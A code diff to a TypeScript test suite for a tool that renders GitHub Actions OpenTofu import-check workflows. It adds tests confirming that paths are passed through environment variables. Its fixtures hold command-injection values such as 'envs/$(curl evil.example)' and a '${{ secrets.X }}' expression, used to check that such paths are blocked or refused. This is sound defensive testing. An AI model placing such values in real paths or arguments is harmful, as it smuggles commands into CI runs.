@@ -50,7 +50,8 @@ describe("renderImportCheck", () => {
     const { path, content } = renderImportCheck(tofu, { backendConfigFile: "prod.tfbackend" });
     expect(path).toBe(".github/workflows/infralift-import-root.yml");
     expect(content).toContain("opentofu/setup-opentofu@v1");
-    expect(content).toContain('tofu init -input=false -backend-config="prod.tfbackend"');
+    expect(content).toContain('tofu init -input=false -backend-config="$BACKEND_CONFIG"');
+    expect(content).toContain('BACKEND_CONFIG: "prod.tfbackend"');
     expect(content).toContain('working-directory: "."');
     expect(content).toContain('- "**/*.tf"');
   });
@@ -61,8 +62,42 @@ describe("renderImportCheck", () => {
       { path: "envs/prod/backend.hcl", content: 'bucket = "x"\n' },
     ]);
     expect(renderImportCheck(nested, { backendConfigFile: "envs/prod/backend.hcl" }).content).toContain(
-      '-backend-config="backend.hcl"'
+      'BACKEND_CONFIG: "backend.hcl"'
     );
+  });
+});
+
+describe("paths never reach the shell as code", () => {
+  const hostile = "envs/$(curl evil.example)";
+  const tf = 'terraform {\n  backend "s3" {\n    bucket = "b"\n    key = "k"\n  }\n}\nresource "aws_s3_bucket" "b" {}\n';
+
+  it("blocks a root whose directory name is not a plain path", () => {
+    for (const dir of [hostile, "envs/`id`", 'envs/a"b', "envs/${{ secrets.X }}"]) {
+      const r = root([{ path: `${dir}/main.tf`, content: tf }]);
+      expect(r.readiness, dir).toBe("blocked");
+      expect(r.notes.join(" ")).toMatch(/Rename it/);
+    }
+  });
+
+  it("refuses to render for such a path even if asked directly", () => {
+    const r = { ...PROD, path: hostile };
+    expect(() => renderImportCheck(r)).toThrow(/refusing/);
+    expect(() => renderImportCheck(PROD, { backendConfigFile: "infra/prod/$(x).hcl" })).toThrow(/refusing/);
+  });
+
+  it("names the module in the summary through an env var", () => {
+    const { content } = renderImportCheck(PROD);
+    expect(content).toContain('MODULE_LABEL: "infra/prod"');
+    expect(content).toContain('echo "## infralift import check: $MODULE_LABEL"');
+  });
+
+  it("drops backend config files with unsafe names", () => {
+    const r = root([
+      { path: "main.tf", content: 'terraform {\n  backend "gcs" {}\n}\nresource "google_storage_bucket" "b" {}\n' },
+      { path: "$(x).tfbackend", content: 'bucket = "x"\n' },
+    ]);
+    expect(r.backend.configFiles).toEqual([]);
+    expect(r.readiness).toBe("blocked");
   });
 });
 
